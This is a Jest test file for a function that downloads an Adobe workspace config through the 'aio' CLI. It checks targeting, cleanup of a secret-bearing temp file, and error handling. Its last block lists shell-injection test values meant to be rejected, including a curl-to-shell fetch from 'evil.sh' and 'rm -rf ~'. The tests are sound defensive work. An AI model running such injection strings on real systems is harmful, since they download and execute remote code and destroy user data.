/**
 * Targeted workspace-config download — the impure half of provisioning.
 *
 * EXPLICIT ids on the command, never the selected CLI context: the user's
 * selected workspace 404'd live ("Workspace not found") while the project's real
 * binding was fine. The mesh handler already passes `--workspaceId`; this passes
 * all three.
 *
 * The downloaded JSON carries the client secret, so the temp-file hygiene is the
 * `runtimeCredentials.ts` pattern: private temp dir, deleted in `finally`, and
 * the content only ever returned — never logged.
 */

import * as fs from 'fs';
import { downloadWorkspaceConfigJson } from '@/features/data-installer/services/workspaceConfigDownload';

const TARGET = { orgId: '285361', projectId: 'proj-1', workspaceId: 'ws-1' };

/** An executor that writes the file the command names, like aio would. */
function executorWriting(content: string | null, code = 0, stderr = '') {
    return {
        execute: jest.fn(async (command: string) => {
            const match = command.match(/"([^"]+)"/);
            if (content !== null && match) {
                fs.writeFileSync(match[1], content);
            }
            return { code, stdout: '', stderr };
        }),
    };
}

describe('downloadWorkspaceConfigJson', () => {
    it('returns the downloaded JSON', async () => {
        const executor = executorWriting('{"project":{}}');

        const raw = await downloadWorkspaceConfigJson(executor as never, TARGET);

        expect(raw).toBe('{"project":{}}');
    });

    it('targets the EXPLICIT org, project and workspace — never the selected context', async () => {
        const executor = executorWriting('{}');

        await downloadWorkspaceConfigJson(executor as never, TARGET);

        const command = executor.execute.mock.calls[0][0] as string;
        expect(command).toContain('aio console workspace download');
        expect(command).toContain('--orgId 285361');
        expect(command).toContain('--projectId proj-1');
        expect(command).toContain('--workspaceId ws-1');
    });

    it('removes the temp file even on success — it holds the client secret', async () => {
        const executor = executorWriting('{"secret":"here"}');

        await downloadWorkspaceConfigJson(executor as never, TARGET);

        const command = executor.execute.mock.calls[0][0] as string;
        const filePath = (command.match(/"([^"]+)"/) as RegExpMatchArray)[1];
        expect(fs.existsSync(filePath)).toBe(false);
    });

    it('throws a readable error on a non-zero exit, without the command output', async () => {
        const executor = executorWriting(null, 2, 'ERROR_DOWNLOAD_WORKSPACE_JSON 404');

        await expect(downloadWorkspaceConfigJson(executor as never, TARGET)).rejects.toThrow(
            /workspace configuration/i,
        );
    });

    it('throws when the command succeeds but no file appears', async () => {
        const executor = executorWriting(null, 0);

        await expect(downloadWorkspaceConfigJson(executor as never, TARGET)).rejects.toThrow();
    });
});

/**
 * SECURITY: the ids are interpolated into a string that `CommandExecutor` runs
 * through a SHELL — it forces `shell: DEFAULT_SHELL` for any command starting
 * `aio ` (`core/shell/commandExecutor.ts`). The ids come from
 * `project.adobe.*`, which `projectFileLoader` reads verbatim out of a
 * `.demo-builder.json` on disk, and the projects directory is scanned for any
 * folder containing one. A shared demo folder is therefore an injection vector.
 *
 * Quoting alone would not close it: `$(...)` survives double quotes. The repo
 * ships `AdobeResourceValidator` for precisely this and `core/shell/README.md`
 * requires shell-true call sites to use it.
 */
describe('command injection', () => {
    it.each([
        ['orgId', { ...TARGET, orgId: 'abc$(curl -s https://evil.sh|sh)' }],
        ['projectId', { ...TARGET, projectId: 'p; rm -rf ~' }],
        ['workspaceId', { ...TARGET, workspaceId: 'w`whoami`' }],
    ])('refuses a hostile %s instead of shelling it out', async (_field, target) => {
        const executor = executorWriting('{}');

        await expect(downloadWorkspaceConfigJson(executor as never, target)).rejects.toThrow();
        expect(executor.execute).not.toHaveBeenCalled();
    });

    it('still accepts the real id shapes', async () => {
        const executor = executorWriting('{"project":{}}');

        await expect(
            downloadWorkspaceConfigJson(executor as never, {
                orgId: '285361',
                projectId: '4566206088345707694',
                workspaceId: '4566206088345747128',
            }),
        ).resolves.toBe('{"project":{}}');
    });
});
